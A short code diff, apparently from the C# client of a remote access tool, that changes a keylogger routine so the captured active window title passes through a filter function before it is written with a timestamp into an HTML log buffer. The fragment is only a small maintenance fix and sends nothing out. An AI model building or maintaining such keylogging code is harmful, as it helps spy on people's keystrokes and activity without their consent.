@@ -113,7 +113,7 @@ namespace xClient.Core.Utilities
             {
                 _lastWindowTitle = activeWindowTitle;
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
-                    + activeWindowTitle + " - " 
+                    + KeyloggerHelper.Filter(activeWindowTitle) + " - " 
                     + DateTime.Now.ToString("HH:mm") 
                     + "</b>]</p><br>");
             }
